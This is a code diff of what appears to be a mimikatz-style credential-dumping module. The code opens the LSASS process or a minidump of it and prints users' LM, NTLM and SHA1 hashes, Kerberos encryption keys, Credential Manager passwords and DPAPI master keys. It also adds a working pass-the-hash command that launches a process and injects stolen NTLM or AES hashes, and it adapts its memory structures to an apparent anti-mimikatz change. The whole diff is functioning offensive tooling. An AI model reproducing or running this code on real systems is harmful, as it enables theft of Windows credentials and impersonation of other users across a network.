@@ -19,9 +19,11 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_process,	L"process",			L"Switch (or reinit) to LSASS process  context"},
 	{kuhl_m_sekurlsa_minidump,	L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
 
-	{kuhl_m_sekurlsa_msv_pth,			L"pth",		L"Pass-the-hash"},
+	{kuhl_m_sekurlsa_pth,				L"pth",		L"Pass-the-hash"},
 	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",	L"List Kerberos tickets"},
+	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",	L"List Kerberos Encryption Keys"},
 	{kuhl_m_sekurlsa_dpapi,				L"dpapi",	L"List Cached MasterKeys"},
+	{kuhl_m_sekurlsa_credman,			L"credman",	L"List Credentials Manager"},
 };
 
 const KUHL_M kuhl_m_sekurlsa = {
@@ -37,13 +39,17 @@ const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
 	&kuhl_m_sekurlsa_kerberos_package,
 	&kuhl_m_sekurlsa_ssp_package,
 	&kuhl_m_sekurlsa_dpapi_svc_package,
+	&kuhl_m_sekurlsa_credman_package,
 };
 
 const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
-	{sizeof(KIWI_MSV1_0_LIST_5) , FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_5, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , pSid)},
-	{sizeof(KIWI_MSV1_0_LIST_6) , FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_6, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , pSid)},
-	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid)},
-	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid)}
+	{sizeof(KIWI_MSV1_0_LIST_51), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_51, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_52), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_52, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager)},
 };
 
 const KUHL_M_SEKURLSA_LOCAL_HELPER lsassLocalHelpers[] = {
@@ -94,7 +100,7 @@ NTSTATUS kuhl_m_sekurlsa_process(int argc, wchar_t * argv[])
 
 NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
 {
-	kprintf(L"Switch to MINIDUMP\n");
+	kprintf(L"Switch to MINIDUMP:");
 	if (argc != 1)
 	{
 		dprintf(L"[KIWI] <minidumpfile.dmp> argument is missing\n");
@@ -103,6 +109,7 @@ NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
 	{
 		kuhl_m_sekurlsa_reset();
 		pMinidumpName = _wcsdup(argv[0]);
+		kprintf(L"\'%s\'\n", pMinidumpName);
 	}
 	return STATUS_SUCCESS;
 }
@@ -178,93 +185,94 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 	DWORD pid;
 	PMINIDUMP_SYSTEM_INFO pInfos;
 	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
+	BOOL isError = FALSE;
 
-	dprintf(L"[KIWI] Attempting to acquire LSA");
-
-	if(!cLsass.hLsassMem)
+	if (!cLsass.hLsassMem)
 	{
 		status = STATUS_NOT_FOUND;
-		if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
+		if (NT_SUCCESS(lsassLocalHelper->initLocalLib()))
 		{
-			if(pMinidumpName)
+			if (pMinidumpName)
 			{
 				Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
+				kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
 				hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 			}
 			else
 			{
 				Type = KULL_M_MEMORY_TYPE_PROCESS;
-				if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
+				if (kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
 					hData = OpenProcess(processRights, FALSE, pid);
-				else dprintf(L"[KIWI] LSASS process not found (?)\n");
+				else PRINT_ERROR(L"LSASS process not found (?)\n");
 			}
 
-			if(hData && hData != INVALID_HANDLE_VALUE)
+			if (hData && hData != INVALID_HANDLE_VALUE)
 			{
-				if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
+				if (kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
 				{
-					if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
+					if (Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
 					{
-						if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
+						if (pInfos = (PMINIDUMP_SYSTEM_INFO)kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
 						{
 							cLsass.osContext.MajorVersion = pInfos->MajorVersion;
 							cLsass.osContext.MinorVersion = pInfos->MinorVersion;
-							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;
+							cLsass.osContext.BuildNumber = pInfos->BuildNumber;
 
-							if(cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION)
-							{
-								dprintf(L"[KIWI] Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
-							}
-						#ifdef _M_X64
-							if (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64)
-							{
-								dprintf(L"[KIWI] Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
-							}
-						#elif defined _M_IX86
-							if (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL)
-							{
-								dprintf(L"[KIWI] Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
-							}
-						#endif
+							if (isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION))
+								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
+#ifdef _M_X64
+							else if (isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
+								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
+#elif defined _M_IX86
+							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
+								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
+#endif
+
 						}
-						else dprintf(L"[KIWI] Minidump without SystemInfoStream (?)\n");
+						else
+						{
+							isError = TRUE;
+							PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
+						}
 					}
 					else
 					{
 						cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
 						cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
-						cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
+						cLsass.osContext.BuildNumber = MIMIKATZ_NT_BUILD_NUMBER;
 					}
-					kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
-					kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
 
-					if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
+					if (!isError)
 					{
-						kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
-						if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
+						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
+						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
+
+						if (NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
 						{
-							status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
-
-							if (!NT_SUCCESS(status))
+							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
+							if (kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
 							{
-								dprintf(L"[KIWI] Key import failed\n");
-							}
-						}
-						else dprintf(L"[KIWI] Logon list failed\n");
-					}
-					else dprintf(L"[KIWI] Modules informations failed\n");
-				}
-				else dprintf(L"[KIWI] Memory opening failed\n");
-			}
-			else dprintf(L"[KIWI] Handle of memory : %08x\n", GetLastError());
+								status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
 
-			if(!NT_SUCCESS(status))
+								if (!NT_SUCCESS(status))
+									PRINT_ERROR(L"Key import\n");
+							}
+							else PRINT_ERROR(L"Logon list\n");
+						}
+						else PRINT_ERROR(L"Modules informations\n");
+					}
+				}
+				else PRINT_ERROR(L"Memory opening\n");
+			}
+			else PRINT_ERROR_AUTO(L"Handle on memory");
+
+			if (!NT_SUCCESS(status))
 			{
 				cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
 				CloseHandle(hData);
 			}
 		}
-		else dprintf(L"[KIWI] Local LSA library failed\n");
+		else PRINT_ERROR(L"Local LSA library failed\n");
 	}
 	return status;
 }
@@ -301,14 +309,22 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 		sessionData.cLsass = &cLsass;
 		sessionData.lsassLocalHelper = lsassLocalHelper;
 
-		if(cLsass.osContext.MajorVersion < 6)
+		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_2K3)
 			helper = &lsassEnumHelpers[0];
-		else if(cLsass.osContext.MinorVersion < 2)
+		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_VISTA)
 			helper = &lsassEnumHelpers[1];
-		else if(cLsass.osContext.MinorVersion < 3)
+		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_7)
 			helper = &lsassEnumHelpers[2];
-		else
+		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_8)
 			helper = &lsassEnumHelpers[3];
+		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
+			helper = &lsassEnumHelpers[5];
+		else
+			helper = &lsassEnumHelpers[6];
+
+
+		if((cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
+			helper++; // yeah, really, I do that =)
 
 		securityStruct.hMemory = cLsass.hLsassMem;
 		securityStruct.address = LogonSessionListCount;
@@ -378,19 +394,39 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LO
 	dprintf(L"[KIWI] callback invoked with %p", pData);
 	if((pData->LogonType != Network)/* && pData->LogonType != UndefinedLogonType*/)
 	{
-		kuhl_m_sekurlsa_printinfos_logonData(pData);
+		dprintf(L"[KIWI] pData->LogonType != Network, printing logon data");
+		//kuhl_m_sekurlsa_printinfos_logonData(pData);
+		dprintf(L"[KIWI] logondata printed, iterating through packages");
 		for(i = 0; i < pLsassData->nbPackages; i++)
 		{
 			if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
 			{
 				kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
-				pLsassData->lsassPackages[i]->CredsForLUIDFunc(&cLsass, pData->LogonId, pData->pCredentials, pLsassData->externalCallback, pLsassData->externalCallbackData);
+				pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData, pLsassData->externalCallback, pLsassData->externalCallbackData);
 				kprintf(L"\n");
 			}
 		}
+		dprintf(L"[KIWI] package iteration done");
 	}
 	return TRUE;
 }
+
+const wchar_t * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
+	L"UndefinedLogonType",
+	L"Unknown !",
+	L"Interactive",
+	L"Network",
+	L"Batch",
+	L"Service",
+	L"Proxy",
+	L"Unlock",
+	L"NetworkCleartext",
+	L"NewCredentials",
+	L"RemoteInteractive",
+	L"CachedInteractive",
+	L"CachedRemoteInteractive",
+	L"CachedUnlock",
+};
 
 void kuhl_m_sekurlsa_printinfos_logonData(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
@@ -414,11 +450,110 @@ NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPack
 	return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData);
 }
 
+NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
+{
+	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
+	TOKEN_STATISTICS tokenStats;
+	SEKURLSA_PTH_DATA data = { &(tokenStats.AuthenticationId), NULL, NULL, NULL, FALSE };
+	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256;
+	DWORD dwNeededSize;
+	HANDLE hToken;
+	PROCESS_INFORMATION processInfos;
+
+	if (kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
+	{
+		if (kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
+		{
+			kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
+			kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\n", szUser, szDomain, szRun);
+
+
+			if (kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
+			{
+				if (MIMIKATZ_NT_BUILD_NUMBER > KULL_M_WIN_MIN_BUILD_BLUE)
+				{
+					if (kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
+					{
+						data.Aes128Key = aes128key;
+						kprintf(L"AES128\t: "); kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
+					}
+					else PRINT_ERROR(L"AES128 key length must be 32 (16 bytes)\n");
+				}
+				else PRINT_ERROR(L"AES128 key only supported from Windows 8.1\n");
+			}
+
+			if (kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
+			{
+				if (MIMIKATZ_NT_BUILD_NUMBER > KULL_M_WIN_MIN_BUILD_BLUE)
+				{
+					if (kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
+					{
+						data.Aes256Key = aes256key;
+						kprintf(L"AES256\t: "); kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
+					}
+					else PRINT_ERROR(L"AES256 key length must be 64 (32 bytes)\n");
+				}
+				else PRINT_ERROR(L"AES256 key only supported from Windows 8.1\n");
+			}
+
+			if (kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
+			{
+				if (kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
+				{
+					data.NtlmHash = ntlm;
+					kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+				}
+				else PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes)\n");
+			}
+			else if (!(data.Aes128Key || data.Aes256Key)) PRINT_ERROR(L"Missing argument : ntlm\n");
+
+			if (data.NtlmHash || data.Aes128Key || data.Aes256Key)
+			{
+				if (kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
+				{
+					kprintf(L" | PID %u\n | TID %u\n", processInfos.dwProcessId, processInfos.dwThreadId);
+					if (OpenProcessToken(processInfos.hProcess, TOKEN_READ, &hToken))
+					{
+						if (GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
+						{
+							kprintf(L" | LUID %u ; %u (%08x:%08x)\n", tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart, tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart);
+							kprintf(L" \\_ msv1_0 - ");
+							kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, &data);
+							kprintf(L"\n");
+							kprintf(L" \\_ kerberos - ");
+							kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, &data);
+							kprintf(L"\n");
+						}
+						else PRINT_ERROR_AUTO(L"GetTokenInformation");
+						CloseHandle(hToken);
+					}
+					else PRINT_ERROR_AUTO(L"OpenProcessToken");
+
+					if (data.isReplaceOk)
+						NtResumeProcess(processInfos.hProcess);
+					else
+						NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
+
+					CloseHandle(processInfos.hThread);
+					CloseHandle(processInfos.hProcess);
+				}
+				else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
+			}
+		}
+		else PRINT_ERROR(L"Missing argument : domain\n");
+	}
+	else PRINT_ERROR(L"Missing argument : user\n");
+
+	return STATUS_SUCCESS;
+}
+
 VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
 {
 	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
 	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
 	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
+	PKERB_HASHPASSWORD_GENERIC pHashPassword;
+	UNICODE_STRING buffer;
 	PVOID base;
 	DWORD type, i;
 	
@@ -442,14 +577,20 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->LogonDomainName, FALSE);
 					if(externalCallback)
 						externalCallback(luid, &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName, NULL, pPrimaryCreds->LmOwfPassword, pPrimaryCreds->NtOwfPassword, externalCallbackData);
+					kprintf(L"\n\t * Username : %wZ\n\t * Domain : %wZ", &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName);
 
-					kprintf(L"\n\t * Username : %wZ"
-						L"\n\t * Domain   : %wZ"
-						, &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName);
-
-					kprintf(L"\n\t * LM       : "); kull_m_string_wprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-					kprintf(L"\n\t * NTLM     : "); kull_m_string_wprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-					kprintf(L"\n\t * SHA1     : "); kull_m_string_wprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
+					if (pPrimaryCreds->isLmOwfPassword)
+					{
+						kprintf(L"\n\t * LM       : "); kull_m_string_wprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+					}
+					if (pPrimaryCreds->isNtOwfPassword)
+					{
+						kprintf(L"\n\t * NTLM     : "); kull_m_string_wprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+					}
+					if (pPrimaryCreds->isShaOwfPassword)
+					{
+						kprintf(L"\n\t * SHA1     : "); kull_m_string_wprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
+					}
 					break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
 					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
@@ -475,6 +616,25 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					LocalFree(mesCreds->UserName.Buffer);
 				}
 			}
+		}
+		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
+		{
+			pHashPassword = (PKERB_HASHPASSWORD_GENERIC) mesCreds;
+			kprintf(L"\t %s ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
+			if (buffer.Length = buffer.MaximumLength = (USHORT)pHashPassword->Size)
+			{
+				buffer.Buffer = (PWSTR)pHashPassword->Checksump;
+				if (kull_m_string_getUnicodeString(&buffer, cLsass.hLsassMem))
+				{
+					if (!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
+						(*lsassLocalHelper->pLsaUnprotectMemory)(buffer.Buffer, buffer.MaximumLength);
+					kull_m_string_wprintf_hex(buffer.Buffer, buffer.Length, 0);
+					LocalFree(buffer.Buffer);
+				}
+
+			}
+			else kprintf(L"<no size, buffer is incorrect>");
+			kprintf(L"\n");
 		}
 		else
 		{
@@ -516,9 +676,13 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						, username, domain);
 
 					if(!password || kull_m_string_suspectUnicodeString(password))
-						kprintf(L"%wZ", password);
-					else 
-						kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
+					{
+						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
+							kprintf(L"%.*s", password->Length / sizeof(wchar_t), password->Buffer);
+						else
+							kprintf(L"%wZ", password);
+					}
+					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
 				}
 
 				LocalFree(mesCreds->UserName.Buffer);
